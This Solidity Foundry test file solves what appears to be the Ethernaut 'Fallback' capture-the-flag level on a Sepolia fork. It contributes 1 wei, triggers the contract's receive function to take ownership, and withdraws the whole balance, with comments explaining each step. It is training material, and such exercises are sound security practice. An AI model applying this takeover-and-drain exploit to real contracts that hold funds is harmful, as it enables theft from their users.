// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackSolution is Test {
    Fallback public fallbackInstance = Fallback(payable(0x813aCfC55db8d05D1F80800F505c1402bbf76A6e)); // Replace with actual deployed address if needed
    address attacker = makeAddr("attacker");

    function setUp() public {
        uint256 sepoliaFork = vm.createSelectFork("sepolia");
        assertEq(vm.activeFork(), sepoliaFork);
        vm.deal(attacker, 1 ether);
        console.log("Owner:", fallbackInstance.owner());
    }
    // forge test --mt testFallbackFork -vvvv

    function testFallbackFork() public {
        // ---- Attack Starts From here ---

        // - As you can see in the contract, we need to be the owner of the contract, to crack it.
        // - the contract has a `receive` function, so we can't send ETH to it.
        // - To be the new owner, the `receive` function checks the sender, sends ETH, and he is one of the contributors.
        // - We will fire `contribute` function, and send 1 wei, so we will be one of the contributors.
        // - Then we will send ETH to the `Fallback` contract (1 wei), since we are one of the contributors, we will path the check, and we will be the owner of the contract.
        // - We passed the first requirement and became the owners of the contract.
        // - We can simply call `withdraw` and take all `Fallback` ETH since we are the new owners.

        vm.startPrank(attacker);
        fallbackInstance.contribute{value: 1 wei}(); //send ether when interacting with an ABI
        (bool success,) = address(fallbackInstance).call{value: 1 wei}(""); //send ether outside of the ABI
        require(success, "Revert sending 1 wei to `fallbackInstance`");
        console.log("New Owner:", fallbackInstance.owner()); // We became the owners

        fallbackInstance.withdraw();
        vm.stopPrank();
        assertEq(address(fallbackInstance).balance, 0, "Fallback contract should have 0 balance after withdrawal");
        assertEq(fallbackInstance.owner(), attacker, "Attacker should be the new owner of the Fallback contract");
    }
}
